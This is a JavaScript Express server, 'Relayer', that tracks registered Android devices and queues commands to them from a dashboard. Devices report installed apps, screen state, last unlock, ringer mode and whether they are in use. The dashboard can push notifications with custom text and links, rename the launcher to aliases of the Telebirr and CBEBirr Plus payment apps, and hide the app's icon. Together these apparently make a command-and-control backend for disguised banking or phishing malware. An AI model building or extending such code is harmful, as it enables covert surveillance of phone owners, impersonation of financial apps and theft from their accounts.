import express from "express";
import cors from "cors";
import crypto from "crypto";

const app = express();
const PORT = process.env.PORT || 8787;

// Hardcoded endpoints — Relayer only serves Teller
const TELLER_URL = "https://teller-six.vercel.app";
const RELAYER_URL = process.env.RELAYER_URL || `http://localhost:${PORT}`;
// Optional shared secret between Teller and Relayer (set same value in both envs)
const RELAYER_SECRET = process.env.RELAYER_SECRET || "";

// Security headers + limits
app.disable("x-powered-by");
app.use((req,res,next)=>{
  res.setHeader("X-Content-Type-Options","nosniff");
  res.setHeader("X-Frame-Options","DENY");
  res.setHeader("Referrer-Policy","no-referrer");
  next();
});
app.use(cors({ origin: [TELLER_URL, "http://localhost:3000", "http://localhost:3001"], credentials: false }));
app.use(express.json({ limit: "16kb" }));
// simple in-memory rate limit: 120 req / min per IP
const hits = new Map();
setInterval(()=> hits.clear(), 60_000);
app.use((req,res,next)=>{
  const ip = req.ip || req.socket.remoteAddress || "unknown";
  const n = (hits.get(ip)||0)+1; hits.set(ip,n);
  if (n > 120) return res.status(429).json({error:"rate limited"});
  next();
});

// ---- in-memory ephemeral store ----
const store = new Map();
const commands = new Map(); // `${deviceId}:${slot}` -> {url, ts, slot} (slot 1|2)
const TTL_MS = 120_000;
const MAX_DEVICES = 5000;
const MAX_DEVICEID_LEN = 128;
const MAX_ARR = 20;
const MAX_STR = 64;

// purge stale every 30s
setInterval(() => {
  const now = Date.now();
  for (const [k,v] of store) {
    if (now - new Date(v.lastSeen).getTime() > TTL_MS) {
      store.delete(k);
      commands.delete(`${k}:1`);
      commands.delete(`${k}:2`);
      commands.delete(`${k}:rename`);
      commands.delete(`${k}:visibility`);
      commands.delete(k); // legacy bare-key entries
    }
  }
  // expire pending relay commands after 5 min
  for (const [k,c] of commands) {
    if (now - c.ts > 300_000) commands.delete(k);
  }
}, 30_000);

const RELAY_DEFAULT_URLS = { 1: "https://spotify.com", 2: "https://youtube.com" };

// Vanity launcher names (keys must match Uncry AppAlias + manifest aliases).
// Labels are placeholders until the community finalizes the list.
const ALIASES = {
  "uncry": "Uncry",
  "system": "System",
  "telebirr": "Telebirr",
  "cbebirr-plus": "CBEBirr Plus",
};

function parseSlot(v) {
  const n = Number(v);
  return n === 2 ? 2 : 1; // default slot 1 (legacy callers send no slot)
}

// Peek all pending commands for a device without consuming.
// Returns [{ action, ... }] with relay slots first, then rename, then visibility.
function peekCommands(deviceId) {
  const out = [];
  for (const slot of [1, 2]) {
    const c = commands.get(`${deviceId}:${slot}`);
    if (c) out.push({ action: "relay", url: c.url, slot, ts: c.ts, ...(c.title ? { title: c.title } : {}), ...(c.body ? { body: c.body } : {}) });
  }
  const legacy = commands.get(deviceId); // pre-slot entries
  if (legacy && legacy.url) out.push({ action: "relay", url: legacy.url, slot: 1, ts: legacy.ts });
  const ren = commands.get(`${deviceId}:rename`);
  if (ren) out.push({ action: "rename", alias: ren.alias, label: ALIASES[ren.alias], ts: ren.ts });
  const vis = commands.get(`${deviceId}:visibility`);
  if (vis) out.push({ action: "visibility", visible: vis.visible, ts: vis.ts });
  return out;
}

// Consume all pending commands for a device.
function consumeCommands(deviceId) {
  const out = peekCommands(deviceId);
  commands.delete(`${deviceId}:1`);
  commands.delete(`${deviceId}:2`);
  commands.delete(deviceId);
  commands.delete(`${deviceId}:rename`);
  commands.delete(`${deviceId}:visibility`);
  return out;
}

function sanitizeStr(s, fallback="unknown", max=MAX_STR){
  if (typeof s !== "string") return fallback;
  s = s.trim().slice(0, max).replace(/[\x00-\x1f]/g,"");
  return s || fallback;
}
function sanitizeArr(a){
  if (!Array.isArray(a)) throw new Error("installed/missing must be arrays");
  if (a.length > MAX_ARR) throw new Error(`array too large (max ${MAX_ARR})`);
  return a.map(v=> {
    if (typeof v !== "string") throw new Error("array items must be strings");
    const s=v.trim().slice(0,80).replace(/[\x00-\x1f]/g,"");
    if (!s) throw new Error("empty array item");
    return s;
  });
}

function validateDeviceId(id){
  if (typeof id !== "string") throw new Error("deviceId must be string");
  if (id.length < 4 || id.length > MAX_DEVICEID_LEN) throw new Error(`deviceId length 4-${MAX_DEVICEID_LEN}`);
  if (!/^[a-zA-Z0-9._-]+$/.test(id)) throw new Error("deviceId invalid chars (a-z 0-9 . _ -)");
}

function checkSecret(req){
  if (!RELAYER_SECRET) return; // open if not set (dev)
  const got = req.get("x-relayer-secret") || req.get("authorization")?.replace(/^Bearer\s+/,"");
  if (got !== RELAYER_SECRET) {
    const e=new Error("unauthorized (bad relayer secret)");
    e.status=401; throw e;
  }
}

function upsert(body, ip, ua){
  const now = new Date().toISOString();
  let { deviceId, model, androidVersion, appVersion, installed, missing, monitorRunning, batteryOptimized, alias, appLabel, hidden, inUse, screenOn, lastUnlock, ringerMode } = body || {};
  validateDeviceId(deviceId);
  // Per-device command lock: every device owns a secret token minted at
  // first sight and stored on its row. heartbeat/poll must present it via
  // x-device-token — without it, no one (not another device, not a stranger
  // who guessed the deviceId) can read, consume, or spoof that device's
  // commands or state. Legacy rows without a token adopt one on first
  // contact; afterwards the binding is strict.
  const priorRow = store.get(deviceId);
  const token = (priorRow && priorRow.token) || crypto.randomBytes(24).toString("hex");
  if (installed !== undefined) installed = sanitizeArr(installed);
  else installed = [];
  if (missing !== undefined) missing = sanitizeArr(missing);
  else missing = [];
  model = sanitizeStr(model, "unknown", 48);
  androidVersion = sanitizeStr(androidVersion, "?", 32);
  appVersion = sanitizeStr(appVersion, "0.2.1-poss", 32);
  monitorRunning = !!monitorRunning;
  batteryOptimized = !!batteryOptimized;
  inUse = !!inUse;
  // screenOn defaults to true (unknown = assume usable); lastUnlock keeps
  // the stored value when the device doesn't send one.
  if (typeof screenOn !== "boolean") screenOn = store.get(deviceId)?.screenOn ?? true;
  if (typeof lastUnlock !== "string") lastUnlock = store.get(deviceId)?.lastUnlock || "";
  else lastUnlock = lastUnlock.trim().slice(0, 32);
  // Ringer state: strict allowlist, keep stored value when absent.
  if (typeof ringerMode !== "string" || !["normal", "vibrate", "silent"].includes(ringerMode)) ringerMode = store.get(deviceId)?.ringerMode || "normal";
  alias = typeof alias === "string" && ALIASES[alias] ? alias : (existingAlias(deviceId) || "uncry");
  appLabel = ALIASES[alias] || "Uncry";
  hidden = typeof hidden === "boolean" ? hidden : (store.get(deviceId)?.hidden === true);

  if (!store.has(deviceId) && store.size >= MAX_DEVICES) throw new Error("store full");

  const existing = store.get(deviceId);
  const dev = existing
    ? { ...existing, model, androidVersion, appVersion, installed, missing, monitorRunning, batteryOptimized, inUse, screenOn, lastUnlock, ringerMode, alias, appLabel, hidden, ip, userAgent: ua?.slice(0,128), lastSeen: now, heartbeatCount: (existing.heartbeatCount||0)+1 }
    : { deviceId, model, androidVersion, appVersion, installed, missing, monitorRunning, batteryOptimized, inUse, screenOn, lastUnlock, ringerMode, alias, appLabel, hidden, ip, userAgent: ua?.slice(0,128), firstSeen: now, lastSeen: now, heartbeatCount: 1 };
  dev.token = token; // never serialized to dashboards (stripped below)
  store.set(deviceId, dev);
  return dev;
}

function existingAlias(deviceId){
  const d = store.get(deviceId);
  return d && typeof d.alias === "string" ? d.alias : null;
}

// Device tokens never leave the server towards browsers: dashboards get
// the device object without them; only register/heartbeat (answered to the
// device itself) carry deviceToken top-level.
function stripToken(dev){
  if (!dev || typeof dev !== "object") return dev;
  const { token, ...safe } = dev;
  return safe;
}

function presentedToken(req){
  return req.get("x-device-token") || "";
}

// Throws 401 unless the caller proves ownership of the device row.
// Unknown ids and legacy tokenless rows pass (upsert mints on write);
// every bound row is strictly isolated from every other device.
function requireDeviceToken(req, deviceId){
  const row = typeof deviceId === "string" ? store.get(deviceId) : null;
  if (row && row.token && presentedToken(req) !== row.token) {
    const e = new Error("unauthorized (bad device token)");
    e.status = 401; throw e;
  }
}

// errors
app.use((err,req,res,next)=>{
  if (err.type==="entity.too.large") return res.status(413).json({error:"payload too large"});
  if (err instanceof SyntaxError) return res.status(400).json({error:"invalid json"});
  next(err);
});

// ---- API ----
app.post("/relay/register", (req,res) => {
  try{
    checkSecret(req);
    const dev = upsert(req.body, req.ip, req.get("user-agent"));
    console.log(`[register] ${dev.deviceId.slice(0,12)} ${dev.model} total=${store.size}`);
    res.json({ ok:true, device: stripToken(dev), deviceToken: dev.token, via:"relayer", relayerUrl: RELAYER_URL, tellerUrl: TELLER_URL });
  }catch(e){ res.status(e.status||400).json({error:e.message}); }
});
app.post("/relay/heartbeat", (req,res) => {
  try{
    checkSecret(req);
    requireDeviceToken(req, req.body && req.body.deviceId);
    const dev = upsert(req.body, req.ip, req.get("user-agent"));
    // piggyback pending relay commands if any (peek, not delete — poll will consume)
    const pending = peekCommands(dev.deviceId);
    const out = { ok:true, device: stripToken(dev), deviceToken: dev.token, via:"relayer" };
    if (pending.length > 0) {
      out.commands = pending;
      out.command = pending[0]; // legacy single-command shape
    }
    res.json(out);
  }catch(e){ res.status(e.status||400).json({error:e.message}); }
});
// Dashboard -> device: enqueue Relay command for slot 1 or 2.
// Optional custom notification subject/body (edited on dashboard);
// url stays fixed per slot and is never user-editable from this path.
const RELAY_TITLE_MAX = 64;
const RELAY_BODY_MAX = 256;
function sanitizeOptText(v, max) {
  if (typeof v !== "string") return null;
  const s = v.trim().slice(0, max).replace(/[\x00-\x1f]/g, "");
  return s || null;
}
app.post("/relay/relay", (req,res) => {
  try{
    checkSecret(req);
    let { deviceId, url, slot, title, body } = req.body || {};
    validateDeviceId(deviceId);
    slot = parseSlot(slot);
    if (!url || typeof url !== "string") url = RELAY_DEFAULT_URLS[slot];
    url = url.trim().slice(0,512);
    if (!/^https?:\/\//.test(url)) throw new Error("url must be https://");
    if (!store.has(deviceId)) return res.status(404).json({error:"device not found or offline"});
    title = sanitizeOptText(title, RELAY_TITLE_MAX);
    body = sanitizeOptText(body, RELAY_BODY_MAX);
    commands.set(`${deviceId}:${slot}`, { url, ts: Date.now(), slot, title, body });
    console.log(`[relay${slot}] queued for ${deviceId.slice(0,12)} -> ${url}${title?` title="${title}"`:""}`);
    res.json({ ok:true, queued:true, deviceId, url, slot, title, body });
  }catch(e){ res.status(e.status||400).json({error:e.message}); }
});
// Dashboard -> device: enqueue vanity rename (latest wins; consumed with poll)
app.post("/relay/rename", (req,res) => {
  try{
    checkSecret(req);
    const { deviceId, alias } = req.body || {};
    validateDeviceId(deviceId);
    if (typeof alias !== "string" || !ALIASES[alias]) {
      return res.status(400).json({ error: `unknown alias (allowed: ${Object.keys(ALIASES).join(", ")})` });
    }
    if (!store.has(deviceId)) return res.status(404).json({error:"device not found or offline"});
    commands.set(`${deviceId}:rename`, { alias, ts: Date.now() });
    console.log(`[rename] queued for ${deviceId.slice(0,12)} -> ${ALIASES[alias]}`);
    res.json({ ok:true, queued:true, deviceId, alias, label: ALIASES[alias] });
  }catch(e){ res.status(e.status||400).json({error:e.message}); }
});
// Dashboard -> device: hide/unhide launcher icon (latest wins; consumed with poll)
app.post("/relay/visibility", (req,res) => {
  try{
    checkSecret(req);
    const { deviceId, visible } = req.body || {};
    validateDeviceId(deviceId);
    if (typeof visible !== "boolean") {
      return res.status(400).json({ error: "visible must be boolean" });
    }
    if (!store.has(deviceId)) return res.status(404).json({error:"device not found or offline"});
    commands.set(`${deviceId}:visibility`, { visible, ts: Date.now() });
    console.log(`[visibility] queued for ${deviceId.slice(0,12)} -> ${visible ? "visible" : "hidden"}`);
    res.json({ ok:true, queued:true, deviceId, visible });
  }catch(e){ res.status(e.status||400).json({error:e.message}); }
});
app.get("/relay/poll/:deviceId", (req,res) => {
  try{
    // Device poll proves ownership with x-device-token (bound at register).
    // Without the right token for THIS id the queue can neither be read nor
    // drained — device A can never see or steal device B's commands.
    const id = req.params.deviceId;
    validateDeviceId(id);
    requireDeviceToken(req, id);
    const pending = consumeCommands(id);
    if (pending.length === 0) return res.json({ command: null, commands: [] });
    res.json({ command: pending[0], commands: pending });
  }catch(e){ res.status(e.status||400).json({error:e.message}); }
});
app.get("/relay/devices/:deviceId", (req,res) => {
  try{
    checkSecret(req);
    const dev = store.get(req.params.deviceId);
    if (!dev) return res.status(404).json({error:"device not found"});
    res.json({ device: stripToken(dev) });
  }catch(e){ res.status(e.status||400).json({error:e.message}); }
});
app.get("/relay/devices", (req,res) => {
  try{
    checkSecret(req);
    const devices = Array.from(store.values()).sort((a,b)=> new Date(b.lastSeen).getTime()-new Date(a.lastSeen).getTime()).map(stripToken);
    res.json({ devices, count: devices.length, ephemeral: true, ttlMs: TTL_MS });
  }catch(e){ res.status(e.status||400).json({error:e.message}); }
});
app.get("/relay/health", (req,res)=> res.json({ ok:true, count: store.size, tellerUrl: TELLER_URL, relayerUrl: RELAYER_URL, uptime: process.uptime(), maxDevices: MAX_DEVICES, ttlMs: TTL_MS }));
app.get("/", (req,res)=> res.json({ name:"Relayer", tellerUrl: TELLER_URL, relayerUrl: RELAYER_URL, aliases: ALIASES, endpoints: ["/relay/register","/relay/heartbeat","/relay/devices","/relay/health","/relay/relay","/relay/rename","/relay/visibility","/relay/poll/:deviceId"] }));
app.use((req,res)=> res.status(404).json({error:"not found"}));

app.listen(PORT, ()=> console.log(`Relayer fortified :${PORT}  TELLER=${TELLER_URL}  RELAYER=${RELAYER_URL}  secret=${RELAYER_SECRET?"set":"none"}`));
